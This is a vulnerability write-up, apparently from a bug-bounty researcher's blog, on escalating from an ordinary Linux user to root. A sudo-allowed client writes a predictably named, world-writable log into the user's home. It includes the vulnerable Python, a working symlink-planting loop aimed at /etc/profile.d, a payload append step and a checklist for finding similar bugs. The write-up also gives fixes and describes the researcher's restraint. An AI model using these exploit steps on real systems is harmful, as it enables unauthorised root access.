---
title:       "The root process that writes into your folder: from ordinary user to root with a symlink"
summary:     "A service running as root wrote its log into the directory of the user who launched it, with a predictable name, and gave it write permissions for everyone. That is all it takes to create any system file and have root execute it."
date:        2026-11-11 20:30:00 +0100
lang:        en
ref:         escalada-symlink-log-root
permalink:   /en/writeups/symlink-root-log-privilege-escalation/

severity:    high
cvss:        "7.8"
cvss_vector: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
cwe:         "CWE-59 · CWE-732"
vuln_class:  "Access control"
target_type: "Desktop client (Linux)"
platform:    "YesWeHack"
status:      "Reported"
tags:        [privilege-escalation, linux, symlink, toctou, root, permissions]

takeaways:
  - "If a root process writes inside a folder an ordinary user controls, that user decides which file gets written."
  - "`touch` and `chmod` **follow** symlinks. The kernel protection only covers `/tmp`-style directories, not your home."
  - "\"I can run one specific command as root\" and \"I am root\" are different things. Turning the first into the second is privilege escalation."
  - "You do not need to win a race if the filename is predictable: you plant the link and wait."
---

Of all the bugs I have published, this is the simplest to understand and the one that made
me think the most. No injection, no network, no cryptography. Just **a program writing a
log file in the wrong place**.

<div class="warn" markdown="1">
**Everything is anonymised.** Published with the program's permission and without
identifying the product: vendor, file names, paths and versions have been changed. The
mechanism and the code are exact.
</div>

## The starting point: a very sensible `sudo` rule

On a shared Linux machine — a work server, a lab box, a company workstation — the
administrator wants an ordinary user to be able to start a certain application, which needs
root privileges to touch the network. So they add a rule:

```
user ALL=(root) NOPASSWD: /usr/bin/client
```

<div class="plain" markdown="1">
**In plain words:** that line says *"this user may run **this one program** as
administrator, without being asked for a password"*. It is a **correct** and recommended
practice: instead of granting full admin rights, you grant permission for one specific
thing.

The boundary the administrator is drawing is crystal clear: *you may run that program as
root*, not *you are root*. This entire bug is about erasing that boundary.
</div>

And it is worth insisting, because it is the objection I expected from triage: *"but they
could already run something as root"*. No. They could run **one** program. Now they can run
**any**, including reading `/etc/shadow` and installing persistence.

## The three lines of the bug

Inside the client, this:

```python
# configuration
LOGS_DIR = '/home/' + (os.getenv('SUDO_USER') or os.getenv('USER')) + '/.client/logs'

# on connect
log_file = LOGS_DIR + '/log-' + str(int(time.time())) + '.log'
run('touch ' + log_file + '; chmod 666 ' + log_file)

# and the runner
def run(command):
    subprocess.Popen(command, shell=True)
```

Read it slowly, because the three things that break it are right there:

**1. The process is root, but it writes into a user's folder.**

```python
os.getenv('SUDO_USER')
```

<div class="plain" markdown="1">
**In plain words:** when you run something with `sudo`, the system leaves a trace of who
you were: the `SUDO_USER` variable. The program uses it **on purpose** so the logs land in
the user's folder instead of root's. The intention is good — so you can read your own logs
— but the effect is that **an all-powerful process is writing inside territory you fully
control**.
</div>

**2. The filename is predictable.** It is the time, in seconds. Nothing random about it.

**3. It makes it world-writable**, with `chmod 666`.

## What a symlink is and why this breaks everything

A symbolic link is a file that contains no data: it contains **an address**. It is a sign
saying "what you are looking for is over there".

```bash
ln -s /etc/passwd  my-shortcut
cat my-shortcut          # shows /etc/passwd
```

<div class="plain" markdown="1">
**In plain words:** it is a shortcut. What matters for us is **who follows it**: most
programs, when writing to a link, **write to the target**, not to the link.

So if I put a shortcut where you are about to write, and you are root… **you write wherever
I tell you to.**
</div>

And yes: `touch` and `chmod` follow links.

<div class="note" markdown="1">
**"But doesn't the kernel protect against this?"** Partly, through a protection called
`protected_symlinks`. Which is why reading it carefully matters: it only acts on **shared,
sticky-bit** directories, the `/tmp` kind, where every user writes.

A user's home folder **is not one of those**. It is theirs, plain and ordinary. The
protection does not apply. I checked this with both kernel options enabled, which is the
default on a modern distribution.
</div>

## The attack, in four steps

The attacker is a local account with **no privileges**: no special groups, no valid
password, with only the `sudo` rule above.

```bash
# 1 · plant one symlink per second at the predictable log path, pointing at the target
while true; do
    ln -sf /etc/profile.d/x.sh "$HOME/.client/logs/log-$(date +%s).log"
    sleep 1
done
```

```bash
# 2 · wait. This is not a race: the window is minutes wide.
```

```
# 3 · the legitimate user connects. Root runs:
#     touch <path>; chmod 666 <path>
#     ...follows the link and creates /etc/profile.d/x.sh owned by root, mode 666
```

```bash
# 4 · write into that file, now root-owned but writable by anyone
echo 'id > /tmp/CANARY' >> /etc/profile.d/x.sh
```

<div class="plain" markdown="1">
**In plain words:** `/etc/profile.d/` is a folder whose scripts run **every time anyone
opens a login shell**, root included. So I have made root create a file that I can write
to, inside a folder whose contents root executes. Whatever I write there runs with root's
privileges.

And look at step 2: **there is no race to win**. Since the name depends only on the time in
seconds, I plant one link per second and wait calmly. That is the difference between a
"theoretically exploitable" bug and one that works every time.
</div>

Aside: even with no attacker at all, **every log that program writes is left readable and
writable by every user on the machine**. That alone is a problem on any shared box.

## Where I stopped, and why I am saying so

This went in the report and I consider it as important as the bug:

- I did **not** point the link at `/etc/shadow`, `/etc/sudoers.d/`, `/etc/ld.so.preload` or
  any real system file.
- The link pointed at a canary file **carrying my own handle**, which I deleted as soon as
  the point was made.
- I ran nothing as root beyond writing the canary comment.
- I touched nobody's data: the machine was my own VM, with my own accounts.
- I stopped **the moment the primitive was confirmed**, uninstalled the client and removed
  everything.

<div class="plain" markdown="1">
**In plain words:** to prove I can create any file as root, **creating a harmless one is
enough**. Pointing at `/etc/shadow` proves nothing extra and turns your report into an
incident. The difference between a researcher and a problem is exactly where you decide to
stop.
</div>

## The negative control

| What I tried | What happened | What it rules out |
|---|---|---|
| The same flow **without** planting the link | The log is created normally in the user's folder | That the program broke on its own |
| Checking the product's other connection mode | It does **not** use that sequence and writes into a root-owned folder | That it was a general product failure: it is scoped to one path |
| Kernel protections enabled | The attack **works anyway** | That the OS already covered it |

<div class="plain" markdown="1">
**In plain words:** the second row is what buys the most credibility. I checked the sibling
path in the same program and it **was not vulnerable**, and I said so in the report even
though it narrowed my own finding. Scoping your own bug is what makes the triager trust the
rest of what you are telling them.
</div>

## Impact

<div class="impact" markdown="1">
**Impact.** Any unprivileged local user, on a machine where that `sudo` rule exists, gets
**root execution**: reading `/etc/shadow`, persistence, modifying system binaries and
access to every other user's files. The natural setting for this client is shared machines
— workstations, jump hosts, lab boxes — which is exactly where granting a narrow permission
instead of full root is the **correct** practice. The bug punishes precisely the people who
did their job properly.
</div>

## The fix

1. **Write logs into a root-owned directory** such as `/var/log/application/`, not into the
   user's home. That is the one-line fix and it closes the whole thing.
2. If they must stay in the user's home, **open the file from the language** with the flags
   that refuse to follow links and demand creating a fresh file:

   ```python
   os.open(path, os.O_NOFOLLOW | os.O_CREAT | os.O_EXCL, 0o644)
   ```

3. **Drop the `chmod 666`** entirely. There is no reason for a log to be world-writable.
4. **Stop building commands as strings**: pass an argument list instead of a sentence to a
   shell.

## How to look for this yourself

This class is hunted with two commands on any application that runs with privileges:

```bash
# 1 · which files does it touch when running as root?
sudo strace -f -e trace=openat,open,chmod,chown /usr/bin/application 2>&1 \
  | grep -vE '/usr/|/lib/|/proc/'

# 2 · is any of them in a path I control?
```

And the questions, in this order:

1. **Does it write anywhere under my control?** Your home folder, `/tmp`, any directory you
   own.
2. **Is the name predictable?** A timestamp, a counter, a PID. If it carries real
   randomness, it gets much harder.
3. **Does it follow links?** `touch`, `chmod`, `chown`, `cp`, shell `>`: they all do.
4. **Which system file do I want created or made writable?** `/etc/profile.d/`, a system
   service, a scheduled task.

If all four answers go your way, you have a root escalation.
